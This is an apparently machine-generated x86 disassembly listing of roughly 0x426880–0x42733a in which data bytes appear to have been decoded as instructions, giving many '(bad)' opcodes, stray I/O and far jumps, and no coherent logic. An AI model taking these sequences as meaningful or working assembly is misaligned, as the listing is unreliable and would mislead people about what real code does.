  42688d:	popa   
  42688e:	mov    al,ds:0x67045c34
  426893:	(bad)  [esi]
  426895:	daa    
  426896:	xchg   ebx,eax
  426897:	lods   eax,DWORD PTR ds:[esi]
  426898:	add    BYTE PTR [ebp-0x5232fb7d],cl
  42689e:	(bad)  
  42689f:	retf   0xafa1
  4268a2:	xor    dh,BYTE PTR [edi-0x11]
  4268a5:	push   0x9d61ff77
  4268aa:	or     DWORD PTR [edx*2-0x51d47965],edx
  4268b1:	popa   
  4268b2:	jg     0x42686a
  4268b4:	mov    DWORD PTR [esi-0x6f],esp
  4268b7:	inc    ecx
  4268b8:	inc    ecx
  4268b9:	cmc    
  4268ba:	lods   eax,DWORD PTR ds:[esi]
  4268bb:	add    cl,0x5e
  4268be:	xchg   edi,eax
  4268bf:	fs out 0x5,eax
  4268c2:	add    edx,DWORD PTR [esi+0x3c]
  4268c5:	mov    ebx,0xc32025c3
  4268ca:	cmp    al,0x2f
  4268cc:	xor    ebx,DWORD PTR [eax+edi*1-0x1b]
  4268d0:	jae    0x4268b3
  4268d2:	leave  
  4268d3:	xlat   BYTE PTR ds:[ebx]
  4268d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268d6:	sub    eax,0x5dd49650
  4268db:	push   edi
  4268dc:	cmp    al,0xab
  4268de:	sub    DWORD PTR [eax+0x177b9e51],ebx
  4268e4:	adc    ecx,DWORD PTR [ebx+0x1001671c]
  4268ea:	dec    ebx
  4268eb:	ins    BYTE PTR es:[edi],dx
  4268ec:	test   BYTE PTR [edi-0x78],0x65
  4268f0:	test   BYTE PTR [edx-0x4c818324],ah
  4268f6:	stos   DWORD PTR es:[edi],eax
  4268f7:	pop    esp
  4268f8:	rcr    BYTE PTR [ecx-0x68ccd190],cl
  4268fe:	and    DWORD PTR [eax+0x4b06b45e],0x91218f93
  426908:	mov    esi,DWORD PTR [edi+0x6d]
  42690b:	jnp    0x426965
  42690d:	fistp  QWORD PTR [ebx-0x14]
  426910:	(bad)  
  426911:	jge    0x4268ac
  426913:	test   dl,ch
  426915:	jmp    0x8038:0x349358e
  42691c:	cmp    al,0xda
  42691e:	push   0xffffffec
  426920:	popa   
  426921:	retf   0xf223
  426924:	pop    ecx
  426925:	in     al,dx
  426926:	lahf   
  426927:	test   al,0x5d
  426929:	cdq    
  42692a:	sub    bl,0x1e
  42692d:	pop    ds
  42692e:	jg     0x426918
  426930:	sti    
  426931:	xchg   edi,eax
  426932:	jae    0x42699c
  426934:	out    0x98,al
  426936:	enter  0xd00,0x4c
  42693a:	inc    esp
  42693b:	stos   BYTE PTR es:[edi],al
  42693c:	cmp    eax,0x81457d73
  426941:	jne    0x426943
	...
  4269b3:	add    cl,al
  4269b5:	arpl   WORD PTR [edi+eiz*2],ax
  4269b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269b9:	jcxz   0x4269a3
  4269bc:	jne    0x426978
  4269be:	push   ebp
  4269bf:	inc    esp
  4269c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269c1:	mov    al,0xd6
  4269c3:	sub    ebp,DWORD PTR [edx]
  4269c5:	fwait
  4269c6:	add    DWORD PTR [eax],eax
  4269c8:	test   BYTE PTR [eax],0x0
  4269cb:	add    BYTE PTR [esp+edi*4],al
  4269ce:	inc    edx
  4269cf:	mov    DWORD PTR [ebp+0x3636a2c8],eax
  4269d5:	out    dx,eax
  4269d6:	xor    esi,DWORD PTR ss:[eax+0x6bdfe67f]
  4269dd:	add    BYTE PTR [ecx-0x4a],cl
  4269e0:	mov    ds:0xe907cd3b,eax
  4269e5:	adc    dl,BYTE PTR [edi+0x1543d764]
  4269eb:	call   0xe8a8d77
  4269f0:	(bad)  
  4269f2:	pop    ebx
  4269f3:	rcr    cl,0xe7
  4269f6:	mov    esi,0xfa52aa7b
  4269fb:	dec    esi
  4269fc:	arpl   WORD PTR [esi],dx
  4269fe:	pop    ebx
  4269ff:	hlt    
  426a00:	dec    ebp
  426a01:	addr16 repz mov ebp,ss
  426a05:	pop    ecx
  426a06:	je     0x426a42
  426a08:	test   DWORD PTR [ebx+esi*1+0x75],0xebc7fae1
  426a10:	mov    edi,0x4821b7b9
  426a15:	mov    ah,0xf8
  426a17:	cld    
  426a18:	mov    al,0xba
  426a1a:	push   ss
  426a1b:	xor    eax,DWORD PTR [edi]
  426a1d:	lods   eax,DWORD PTR ds:[esi]
  426a1e:	or     al,0x29
  426a20:	stc    
  426a21:	in     al,0x5d
  426a23:	jae    0x426a3c
  426a25:	sub    al,0x87
  426a27:	fwait
  426a28:	cmp    eax,0x21ac89b
  426a2d:	push   0x6
  426a2f:	clc    
  426a30:	daa    
  426a31:	repnz xchg esp,eax
  426a33:	ftst   
  426a35:	ficomp DWORD PTR [esp+edx*4+0x8ad395]
  426a3c:	ja     0x4269d1
  426a3e:	and    BYTE PTR [ecx],0xc6
  426a41:	lock cmp ch,BYTE PTR [edx+0x6c0e102]
  426a48:	pop    edx
  426a49:	in     eax,dx
  426a4a:	mov    ds:0x53e51d6b,eax
  426a4f:	mov    bh,0x85
  426a51:	(bad)  
  426a52:	fidivr WORD PTR [edx]
  426a54:	clc    
  426a55:	mov    bl,0xa7
  426a57:	inc    edi
  426a58:	data16 je 0x426abc
  426a5b:	cmp    BYTE PTR [ecx+0x51],dl
  426a5e:	mov    edi,0x702d8297
  426a63:	retf   0x4143
  426a66:	out    dx,eax
  426a67:	xor    ah,BYTE PTR [ecx+eiz*1+0x50]
  426a6b:	dec    edx
  426a6c:	push   cs
  426a6d:	add    BYTE PTR [ebp-0x53e0197a],ah
  426a73:	addr16 mov ebx,0x835dd0c0
  426a79:	mov    esp,DWORD PTR [edx+0x23559cc9]
  426a7f:	and    eax,0x7bc14ebb
  426a84:	push   ss
  426a85:	pop    esi
  426a86:	xlat   BYTE PTR ds:[ebx]
  426a87:	mov    dl,0x4
  426a89:	jo     0x426a0e
  426a8b:	cmp    BYTE PTR [esi],dh
  426a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a8e:	dec    esp
  426a8f:	retf   
  426a90:	inc    ebx
  426a91:	clc    
  426a92:	lea    ebx,[ecx-0x34]
  426a95:	inc    ecx
  426a96:	test   al,0xba
  426a98:	clc    
  426a99:	and    cl,BYTE PTR [ebx-0x3c5c23b]
  426a9f:	mov    ch,0x19
  426aa1:	rcr    edx,1
  426aa3:	test   eax,0x21468512
  426aa8:	mov    bh,0x6c
  426aaa:	lock iret 
  426aac:	pushf  
  426aad:	js     0x426a63
  426aaf:	push   0x66a414d1
  426ab4:	jle    0x426a87
  426ab6:	inc    ebx
  426ab7:	icebp  
  426ab8:	rol    edx,1
  426aba:	fsubr  QWORD PTR ds:0x1ab843b2
  426ac0:	imul   edi,DWORD PTR [ebx],0x0
	...
  426b32:	add    BYTE PTR [eax],al
  426b34:	(bad)  
  426b35:	clc    
  426b36:	jnp    0x426b8e
  426b38:	jg     0x426b11
  426b3a:	in     eax,dx
  426b3b:	cli    
  426b3c:	cwde   
  426b3d:	inc    ebx
  426b3e:	mov    dh,0x90
  426b40:	ja     0x426b8c
  426b42:	fdivr  DWORD PTR [edx+0x20]
  426b45:	pushf  
  426b46:	add    DWORD PTR [eax],eax
  426b48:	test   BYTE PTR [eax],0x0
  426b4b:	add    BYTE PTR [esi+ebx*4-0x59],ah
  426b4f:	xor    BYTE PTR [eax+0x64],bh
  426b52:	and    dh,BYTE PTR [ebx-0x6f]
  426b55:	fstp   st(0)
  426b57:	mov    al,ds:0xbbed00b7
  426b5c:	mov    bh,0xd3
  426b5e:	gs or  al,0xb7
  426b61:	push   edx
  426b62:	add    DWORD PTR [edi],esp
  426b64:	xor    eax,0xb06e9f3f
  426b69:	or     eax,0x938f3fdf
  426b6e:	shr    BYTE PTR [ebp+0x74],0xde
  426b72:	out    0x25,eax
  426b74:	sub    DWORD PTR [edx+0x5],esp
  426b77:	jbe    0x426bdd
  426b79:	dec    ebx
  426b7a:	or     al,0x6d
  426b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b7d:	bound  ecx,QWORD PTR [eax]
  426b7f:	xchg   ebp,eax
  426b80:	and    al,0x2d
  426b82:	cmp    DWORD PTR [edx+0x7c],esi
  426b85:	push   ebx
  426b86:	pop    ss
  426b87:	xchg   edi,eax
  426b88:	ins    DWORD PTR es:[edi],dx
  426b89:	out    0xaa,al
  426b8b:	pop    esi
  426b8c:	inc    ebp
  426b8d:	adc    bl,BYTE PTR [ebx+0x7d]
  426b90:	mov    ds,WORD PTR [ecx]
  426b92:	xor    BYTE PTR [ebx],al
  426b94:	std    
  426b95:	or     esp,DWORD PTR [eax]
  426b97:	xor    eax,0x2e3ee17e
  426b9c:	xor    eax,0xf9a12974
  426ba1:	fcomp  QWORD PTR ds:0x5e4ed9a0
  426ba7:	mov    bh,0x65
  426ba9:	push   edi
  426baa:	lea    esi,[esi+0x2b0b564a]
  426bb0:	inc    edx
  426bb1:	xchg   esp,eax
  426bb2:	mov    ah,0xc8
  426bb4:	mov    ds:0xbef0c0a6,eax
  426bb9:	(bad)  
  426bba:	call   0xb02a4098
  426bbf:	(bad)  
  426bc0:	adc    edx,DWORD PTR [edi-0x3bbd34b3]
  426bc6:	outs   dx,BYTE PTR ds:[esi]
  426bc7:	cmp    al,0x8c
  426bc9:	add    al,0xd3
  426bcb:	nop
  426bcc:	push   ebx
  426bcd:	push   ds
  426bce:	push   ss
  426bcf:	gs mov edx,0x6dc409a
  426bd5:	mov    DWORD PTR [ebx],ebp
  426bd7:	pusha  
  426bd8:	enter  0x1290,0x9e
  426bdc:	popf   
  426bdd:	addr16 es js 0x5add5198
  426be5:	jmp    0x29eb:0x2f93450b
  426bec:	into   
  426bed:	and    bh,BYTE PTR [ebx]
  426bef:	hlt    
  426bf0:	fs cmc 
  426bf2:	mov    ds:0x5f48185c,eax
  426bf7:	call   0x4c6f:0x6b69628c
  426bfe:	mov    DWORD PTR [esi+eax*2],esp
  426c01:	adc    ebx,DWORD PTR [ebx+0x20c9ee90]
  426c07:	inc    esp
  426c08:	loope  0x426bd8
  426c0a:	fiadd  WORD PTR [ebx+0x76011e8c]
  426c10:	and    al,0x2b
  426c12:	das    
  426c13:	sbb    BYTE PTR [edi+0x27],ch
  426c16:	inc    esi
  426c17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c18:	xor    cl,dl
  426c1a:	in     al,dx
  426c1b:	int    0x88
  426c1d:	mov    cl,0x48
  426c1f:	dec    edi
  426c20:	mov    ecx,0xc6a88a33
  426c25:	mov    eax,ds:0x48360d0
  426c2a:	jmp    0x426ca6
  426c2c:	mov    dh,0xe6
  426c2e:	jle    0x426c9a
  426c30:	fcomp  st(5)
  426c32:	xor    ah,BYTE PTR [bx+si+0x7a]
  426c36:	push   edi
  426c37:	add    BYTE PTR [edi+0x50339776],dh
  426c3d:	and    bl,BYTE PTR [esi]
  426c3f:	push   edi
  426c40:	(bad)  
  426c41:	cmp    eax,DWORD PTR [eax]
	...
  426cb3:	add    bh,bh
  426cb5:	lods   al,BYTE PTR ds:[esi]
  426cb6:	fadd   QWORD PTR [edi]
  426cb8:	fbstp  TBYTE PTR [edi-0x1]
  426cbb:	cld    
  426cbc:	inc    eax
  426cbd:	push   ds
  426cbe:	cdq    
  426cbf:	das    
  426cc0:	ins    BYTE PTR es:[edi],dx
  426cc1:	add    BYTE PTR [edx+0x19d16b0],ah
  426cc7:	add    dh,dh
  426cc9:	add    BYTE PTR [eax],al
  426ccb:	add    BYTE PTR [edx+0x65498017],bl
  426cd1:	adc    DWORD PTR [edx],esp
  426cd3:	gs imul esi
  426cd6:	cdq    
  426cd7:	call   esp
  426cd9:	add    al,0x85
  426cdb:	push   ebp
  426cdc:	and    eax,0x7f7343b1
  426ce1:	cmp    BYTE PTR [edi+0x46],al
  426ce4:	or     esp,eax
  426ce6:	mov    ah,0x54
  426ce8:	push   ebp
  426ce9:	mov    BYTE PTR [edi],ah
  426ceb:	lahf   
  426cec:	ins    DWORD PTR es:[edi],dx
  426ced:	mov    dl,0x3
  426cef:	dec    ebx
  426cf0:	cmp    BYTE PTR [ecx-0x43b703fb],dh
  426cf6:	(bad)  
  426cf7:	and    DWORD PTR [esi],ecx
  426cf9:	ins    BYTE PTR es:[edi],dx
  426cfa:	clc    
  426cfb:	imul   BYTE PTR [ebp+0x1b830dde]
  426d01:	sbb    bh,BYTE PTR [edx-0x38e5d5f7]
  426d07:	sahf   
  426d08:	jge    0x426cf1
  426d0a:	sbb    al,0xcf
  426d0c:	(bad)
  426d0f:	add    al,0xb7
  426d11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d12:	das    
  426d13:	cmc    
  426d14:	mov    al,0x19
  426d16:	repnz pop ebp
  426d18:	dec    edi
  426d19:	mov    esp,edx
  426d1b:	mov    esp,0xe5bed224
  426d20:	mov    al,ds:0x7fc44164
  426d25:	mov    ebp,0xfa3ba10d
  426d2a:	int3   
  426d2b:	adc    al,0x34
  426d2d:	xchg   ebp,eax
  426d2e:	mov    ah,0xb7
  426d30:	retf   0xfff8
  426d33:	adc    al,0x11
  426d35:	cmp    dh,BYTE PTR [ebp-0x50804be3]
  426d3b:	push   ds
  426d3c:	mov    esp,0x3cacee
  426d41:	js     0x426d29
  426d43:	imul   ebx,DWORD PTR [ecx+0x14acb4a4],0xffffff9f
  426d4a:	push   edx
  426d4b:	jmp    0x3166d69b
  426d50:	iret   
  426d51:	sub    BYTE PTR [edx],0xce
  426d54:	and    ah,BYTE PTR [edi+0x132e50f4]
  426d5a:	mov    edi,0xa98e6f87
  426d5f:	(bad)  
  426d60:	ss xchg dl,cl
  426d63:	push   esp
  426d64:	das    
  426d65:	dec    eax
  426d66:	es jmp 0x7d2f979e
  426d6c:	dec    edi
  426d6d:	cmp    ah,BYTE PTR [esi-0x4b840bb9]
  426d73:	xor    bh,BYTE PTR [esi]
  426d75:	rol    DWORD PTR [esi-0x4a],cl
  426d78:	test   BYTE PTR [ebx],ah
  426d7a:	sub    DWORD PTR [edx+0x39be5cd1],ebx
  426d80:	fcom   DWORD PTR [eax+ebp*4]
  426d83:	aad    0xcb
  426d85:	(bad)  
  426d86:	pop    ss
  426d87:	inc    esp
  426d88:	mov    eax,ds:0x2108b5b0
  426d8d:	pop    esp
  426d8e:	rcr    BYTE PTR [eax],1
  426d90:	call   0xa4057ddd
  426d95:	imul   eax,DWORD PTR [eax],0x916758df
  426d9b:	push   ds
  426d9c:	mov    ah,0x4a
  426d9e:	or     al,0xe1
  426da0:	push   edx
  426da1:	mov    esi,0xe0d1b336
  426da6:	mov    esi,0x7a6d4664
  426dab:	sbb    ebp,DWORD PTR [ebx]
  426dad:	outs   dx,DWORD PTR ds:[esi]
  426dae:	inc    ebp
  426daf:	mov    ebp,0xd1bea2d1
  426db4:	and    BYTE PTR [eax],0xc3
  426db7:	or     DWORD PTR [ebp+0x4318a68a],0x51
  426dbe:	xchg   esp,eax
  426dbf:	pop    ss
  426dc0:	or     dh,BYTE PTR [ebp+0x0]
	...
  426e32:	add    BYTE PTR [eax],al
  426e34:	(bad)  
  426e35:	jl     0x426e88
  426e37:	sar    bl,1
  426e39:	std    
  426e3a:	(bad)  
  426e3b:	jle    0x426df9
  426e3d:	(bad)  
  426e3e:	loop   0x426e84
  426e40:	xchg   ebp,eax
  426e41:	pop    ebp
  426e42:	add    BYTE PTR [esp+ecx*1-0x62],0x1
  426e47:	add    dh,dh
  426e49:	add    BYTE PTR [eax],al
  426e4b:	add    BYTE PTR [edx],ah
  426e4d:	push   edx
  426e4e:	xor    DWORD PTR [eax],eax
  426e50:	push   0xcacfde33
  426e55:	aas    
  426e56:	push   ebp
  426e57:	loope  0x426e13
  426e59:	mov    ch,0xc7
  426e5b:	add    eax,0x1dda59e1
  426e60:	dec    edi
  426e61:	xchg   ebp,eax
  426e62:	movntq QWORD PTR [ecx-0x370f176e],mm6
  426e69:	push   eax
  426e6a:	mov    ebx,0x789e8268
  426e6f:	push   ebx
  426e70:	jo     0x426ea8
  426e72:	inc    edx
  426e73:	es (bad) 
  426e75:	(bad)  
  426e76:	in     al,dx
  426e77:	(bad)  
  426e78:	push   ds
  426e79:	ins    BYTE PTR es:[edi],dx
  426e7a:	hlt    
  426e7b:	jp     0x426e55
  426e7d:	ins    DWORD PTR es:[edi],dx
  426e7e:	sub    BYTE PTR [esi],bl
  426e80:	pop    esp
  426e81:	scas   eax,DWORD PTR es:[edi]
  426e82:	unpcklps xmm2,xmm6
  426e85:	xchg   esp,eax
  426e86:	retf   0x814a
  426e89:	mov    ah,0x4e
  426e8b:	fwait
  426e8c:	sub    eax,DWORD PTR ds:0x5cea4d9a
  426e92:	inc    esi
  426e93:	inc    ebp
  426e94:	lea    ebp,[ebp-0x22]
  426e97:	mov    edx,0xb76c814e
  426e9c:	lahf   
  426e9d:	xchg   ebp,eax
  426e9e:	xor    esp,DWORD PTR [ebp-0x28]
  426ea1:	sbb    eax,0x16d298cc
  426ea6:	xchg   ebx,eax
  426ea7:	push   ecx
  426ea8:	aad    0x6e
  426eaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426eab:	inc    eax
  426eac:	(bad)  
  426ead:	xchg   ebx,eax
  426eae:	push   ebx
  426eaf:	adc    al,0xec
  426eb1:	add    edx,ecx
  426eb3:	inc    esp
  426eb4:	mov    ah,0x11
  426eb6:	and    al,ch
  426eb8:	in     al,dx
  426eb9:	sbb    eax,0xfb607989
  426ebe:	mov    ch,0xcd
  426ec0:	add    bh,cl
  426ec2:	popf   
  426ec3:	das    
  426ec4:	mov    eax,ds:0x829f2f6b
  426ec9:	fs iret 
  426ecb:	bound  ebx,QWORD PTR [edi]
  426ecd:	xor    esp,DWORD PTR [eax+0x528cbf25]
  426ed3:	mov    esi,0xee795d65
  426ed8:	lock and DWORD PTR [ebx+0x71c276a7],edx
  426edf:	out    0x33,eax
  426ee1:	pop    esi
  426ee2:	cmp    ah,ch
  426ee4:	lea    ecx,[ebx-0x6e048b0e]
  426eea:	push   0xdc8081c3
  426eef:	and    DWORD PTR [edi-0x46],edi
  426ef2:	scas   al,BYTE PTR es:[edi]
  426ef3:	sbb    al,al
  426ef5:	fcom   QWORD PTR [ebx-0x733f84b]
  426efb:	lahf   
  426efc:	xor    esp,esi
  426efe:	mov    ah,0x37
  426f00:	lea    eax,[ebp+0x279e7dd8]
  426f06:	sbb    ebp,esp
  426f08:	pop    ecx
  426f09:	sub    DWORD PTR [edx+0x1b],esp
  426f0c:	popf   
  426f0d:	(bad)  
  426f0e:	js     0x426f40
  426f10:	xchg   ecx,eax
  426f11:	xchg   ebp,eax
  426f12:	mov    esi,0xafef5bf3
  426f17:	outs   dx,BYTE PTR ds:[esi]
  426f18:	jo     0x426f3f
  426f1a:	fnsave [edx]
  426f1c:	or     DWORD PTR [ebp-0x35],esp
  426f1f:	fstp   st(6)
  426f21:	pop    ebx
  426f22:	dec    edx
  426f23:	push   edx
  426f24:	push   edx
  426f25:	in     al,dx
  426f26:	sbb    eax,0x84c4bbc5
  426f2b:	into   
  426f2c:	nop
  426f2d:	jbe    0x426ee4
  426f2f:	and    DWORD PTR [esi],0xfffffff0
  426f32:	repz jnp 0x426f09
  426f35:	icebp  
  426f36:	arpl   WORD PTR [ecx+ebx*2],dx
  426f39:	sub    dl,BYTE PTR gs:[eax-0x49cfceb5]
  426f40:	mov    dh,0x63
	...
  426fb2:	add    BYTE PTR [eax],al
  426fb4:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  426fba:	cmp    eax,0xcc7989bf
  426fbf:	pop    ebx
  426fc0:	adc    BYTE PTR [edx-0x60fde9d1],bh
  426fc6:	add    DWORD PTR [eax],eax
  426fc8:	test   BYTE PTR [eax],0x0
  426fcb:	add    bl,bh
  426fcd:	push   edi
  426fce:	mov    eax,0x759977f6
  426fd3:	fsub   QWORD PTR [ebx-0x25]
  426fd6:	ins    BYTE PTR es:[edi],dx
  426fd7:	jmp    0x2227:0xf927364a
  426fde:	lock add esp,DWORD PTR [ecx+0x5d996872]
  426fe5:	popf   
  426fe6:	ret    
  426fe7:	xor    al,0xfa
  426fe9:	rcl    DWORD PTR [edi-0x740fc7b0],1
  426fef:	stc    
  426ff0:	mov    ch,0x50
  426ff2:	jne    0x426ff1
  426ff4:	xchg   edx,eax
  426ff5:	sahf   
  426ff6:	push   eax
  426ff7:	stc    
  426ff8:	in     eax,0x45
  426ffa:	push   esp
  426ffb:	cld    
  426ffc:	mov    ebp,DWORD PTR [eax+0x51]
  426fff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427000:	mov    eax,0x9ee563cb
  427005:	addr16 pop ebx
  427007:	or     ah,BYTE PTR [ecx]
  427009:	shl    BYTE PTR [ebp-0x4fb7b54d],1
  42700f:	sti    
  427010:	inc    ebp
  427011:	bswap  edx
  427013:	daa    
  427014:	sub    cl,bh
  427016:	cli    
  427017:	scas   al,BYTE PTR es:[edi]
  427018:	dec    ebp
  427019:	sbb    bl,dh
  42701b:	das    
  42701c:	mov    al,0x45
  42701e:	(bad)  
  42701f:	mov    DWORD PTR [edi],ebp
  427021:	pushf  
  427022:	dec    ebx
  427023:	test   BYTE PTR [ebx],al
  427025:	mov    esi,0x4c63085b
  42702a:	sqrtps xmm7,XMMWORD PTR [ebp-0x24c19b09]
  427031:	cld    
  427032:	dec    esp
  427033:	lea    edx,[edi]
  427035:	(bad)  
  427036:	jmp    0xf122eb65
  42703b:	fidiv  DWORD PTR [edi+0x70975c03]
  427041:	sub    DWORD PTR [esi+0x13226c63],ebx
  427047:	cmp    BYTE PTR [esi-0x7e],bl
  42704a:	pushf  
  42704b:	in     eax,dx
  42704c:	push   ds
  42704d:	xor    al,0x54
  42704f:	pop    ebx
  427050:	and    dh,ch
  427052:	push   0x4760f401
  427057:	dec    eax
  427058:	and    al,0x34
  42705a:	dec    esp
  42705b:	inc    esp
  42705c:	dec    edi
  42705d:	pop    es
  42705e:	pop    es
  42705f:	(bad)  
  427060:	jge    0x42702c
  427062:	push   ebp
  427063:	mov    esi,0x94124933
  427068:	daa    
  427069:	or     al,0xf2
  42706b:	retf   
  42706c:	arpl   WORD PTR [esi],cx
  42706e:	bound  esi,QWORD PTR gs:[esp+eax*1-0x32]
  427073:	cmp    ecx,DWORD PTR [edx+0x92de74e]
  427079:	icebp  
  42707a:	outs   dx,DWORD PTR ds:[esi]
  42707b:	cwde   
  42707c:	sbb    BYTE PTR [esi+0x4459878b],bh
  427082:	fimul  WORD PTR [esi-0x2107125b]
  427088:	outs   dx,DWORD PTR ds:[esi]
  427089:	or     bl,BYTE PTR [edx-0x39d554b4]
  42708f:	out    dx,eax
  427090:	mov    cl,0xb2
  427092:	jl     0x427094
  427094:	dec    edi
  427095:	lock and bh,BYTE PTR [eax+0x2b503fdd]
  42709c:	xchg   edi,eax
  42709d:	cli    
  42709e:	aam    0x64
  4270a0:	hlt    
  4270a1:	cs xchg ebp,ecx
  4270a4:	loop   0x4270d0
  4270a6:	mov    dl,0xd9
  4270a8:	iret   
  4270a9:	imul   edx,DWORD PTR [ecx-0x5a],0x9c2c38c4
  4270b0:	mov    al,ds:0xb06532c6
  4270b5:	mov    DWORD PTR [edx],ebx
  4270b7:	pop    esi
  4270b8:	pop    ebp
  4270b9:	out    dx,al
  4270ba:	mov    ebp,0xfbb8affb
  4270bf:	mov    esi,0x543e
	...
  427134:	fwait
  427135:	and    DWORD PTR [edi],ecx
  427137:	popa   
  427138:	mov    edi,0xcefbff6f
  42713d:	aad    0x24
  42713f:	aam    0x5f
  427141:	(bad)  
  427142:	aad    0xb0
  427144:	clc    
  427145:	lahf   
  427146:	add    DWORD PTR [eax],eax
  427148:	test   BYTE PTR [eax],0x0
  42714b:	add    al,cl
  42714d:	stos   DWORD PTR es:[edi],eax
  42714e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42714f:	adc    BYTE PTR [esi-0x15],bl
  427152:	sub    ecx,DWORD PTR [edx+eax*2+0x4c8d570f]
  427159:	int    0xff
  42715b:	adc    ch,BYTE PTR [ebx-0x50]
  42715e:	int3   
  42715f:	aaa    
  427160:	data16 sbb BYTE PTR [ecx+ecx*8],ah
  427164:	or     eax,0xb1187c83
  427169:	test   DWORD PTR [ebp+0x61],ecx
  42716c:	into   
  42716d:	inc    ebp
  42716e:	ror    BYTE PTR [edx],0xd8
  427171:	push   0x8d4668f
  427176:	push   ebx
  427177:	inc    edx
  427178:	ins    DWORD PTR es:[edi],dx
  427179:	pop    es
  42717a:	jmp    0x427164
  42717c:	sub    BYTE PTR cs:[ebx-0x70924767],dl
  427183:	daa    
  427184:	xchg   ecx,eax
  427185:	js     0x427197
  427187:	xchg   eax,esi
  427189:	pop    es
  42718a:	in     al,0x7a
  42718c:	in     al,0xb3
  42718e:	add    ebp,esp
  427190:	jo     0x4271bd
  427192:	inc    edi
  427193:	push   0x3f3cf1f3
  427198:	pop    eax
  427199:	xor    ecx,esp
  42719b:	sub    ebx,ebx
  42719d:	push   esp
  42719e:	stc    
  42719f:	adc    al,0x5b
  4271a1:	ins    BYTE PTR es:[edi],dx
  4271a2:	add    dh,bh
  4271a4:	ds mov edx,0xa6bf1b25
  4271aa:	outs   dx,DWORD PTR ds:[esi]
  4271ab:	dec    edi
  4271ac:	nop
  4271ad:	and    eax,0xe6b5e248
  4271b2:	inc    eax
  4271b3:	pop    ebp
  4271b4:	mov    ebp,0xac0a18f9
  4271b9:	and    cl,ah
  4271bb:	jne    0x4271bc
  4271bd:	pop    ebp
  4271be:	pop    edi
  4271bf:	push   ebp
  4271c0:	pushf  
  4271c1:	adc    BYTE PTR [edi-0x22abc0a2],dh
  4271c7:	xchg   ebp,eax
  4271c8:	loopne 0x427176
  4271ca:	out    0xda,eax
  4271cc:	leave  
  4271cd:	adc    dl,dl
  4271cf:	idiv   BYTE PTR [eax+0x8636578]
  4271d5:	mov    ds,ebx
  4271d7:	pop    esi
  4271d8:	aad    0xf4
  4271da:	or     DWORD PTR [ebx-0x3a02929c],ebp
  4271e0:	jge    0x427188
  4271e2:	sar    ch,cl
  4271e4:	push   esp
  4271e5:	dec    edi
  4271e6:	das    
  4271e7:	lahf   
  4271e8:	bound  esi,QWORD PTR [edx+0x7a]
  4271eb:	ss mov dh,0x21
  4271ee:	xor    DWORD PTR [esi],esi
  4271f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4271f1:	add    DWORD PTR [esi],ebp
  4271f3:	mov    bl,0xd5
  4271f5:	and    al,0x35
  4271f7:	sub    BYTE PTR [esi],0x67
  4271fa:	jl     0x427232
  4271fc:	rcr    dl,1
  4271fe:	or     BYTE PTR es:[ebx+0x7c],bl
  427202:	pop    ds
  427203:	xchg   ecx,eax
  427204:	in     eax,0xc3
  427206:	mov    al,0x71
  427208:	stos   BYTE PTR es:[edi],al
  427209:	stos   BYTE PTR es:[edi],al
  42720a:	adc    eax,DWORD PTR [eax-0x34]
  42720d:	sbb    BYTE PTR [esi+0x2c],ah
  427210:	bound  eax,QWORD PTR [ecx-0x58143d3b]
  427216:	push   ebp
  427217:	jmp    0x592c0e4d
  42721c:	and    DWORD PTR [edx+eiz*1],esp
  42721f:	mov    cl,0xca
  427221:	push   eax
  427222:	mov    eax,ds:0x43139de6
  427227:	xor    ebp,esp
  427229:	or     edi,DWORD PTR [esp+edi*8+0x348601c4]
  427230:	or     al,0xe7
  427232:	pop    ebx
  427233:	push   es
  427234:	repz jge 0x42729d
  427237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427238:	sub    esi,DWORD PTR [eax+0x60]
  42723b:	rcr    DWORD PTR [ebp+0x17219933],0x78
	...
  4272b2:	add    BYTE PTR [eax],al
  4272b4:	push   esp
  4272b5:	and    eax,0xeefd4e8d
  4272ba:	xlat   BYTE PTR ds:[ebx]
  4272bb:	aas    
  4272bc:	jle    0x427280
  4272be:	ds jmp 0x79e38ab1
  4272c4:	out    dx,al
  4272c5:	mov    al,ds:0xf60001
  4272ca:	add    BYTE PTR [eax],al
  4272cc:	add    BYTE PTR ds:[esi*8-0x624d08ab],cl
  4272d4:	xor    DWORD PTR [eax-0x204612bd],0x3a
  4272db:	jl     0x427283
  4272dd:	adc    al,dl
  4272df:	sub    ebx,edi
  4272e1:	inc    ebp
  4272e2:	inc    eax
  4272e3:	mov    cl,0x7b
  4272e5:	jnp    0x427299
  4272e7:	mov    esp,cs
  4272e9:	ds jbe 0x427311
  4272ec:	in     eax,0xa9
  4272ee:	scas   eax,DWORD PTR es:[edi]
  4272ef:	ret    
  4272f0:	das    
  4272f1:	push   ss
  4272f2:	xor    al,0x9f
  4272f4:	repnz xor eax,0x94174d2f
  4272fa:	xor    eax,0xbe10a747
  4272ff:	rcr    DWORD PTR [eax+0x6b],0x59
  427303:	ja     0x42728f
  427305:	pop    ebp
  427306:	sub    al,0xe0
  427308:	inc    edx
  427309:	ret    0x4758
  42730c:	xchg   ebx,eax
  42730d:	sbb    ebx,eax
  42730f:	sar    DWORD PTR [ecx+0x74],1
  427312:	adc    al,0x35
  427314:	in     al,dx
  427315:	jp     0x42730b
  427317:	das    
  427318:	cld    
  427319:	(bad)  [eax]
  42731b:	retf   
  42731c:	xor    bh,BYTE PTR [esi-0x5ddf6cbd]
  427322:	rcl    DWORD PTR ds:[eax-0x67],cl
  427326:	push   esp
  427327:	pop    esi
  427328:	mov    WORD PTR es:[ebp-0x57],es
  42732c:	jmp    0xf1df5bd9
  427331:	out    0xf3,eax
  427333:	pop    ebx
  427334:	vperm2f128 ymm2,ymm2,ymm2,0x76
  42733a:	mov    ch,0xad
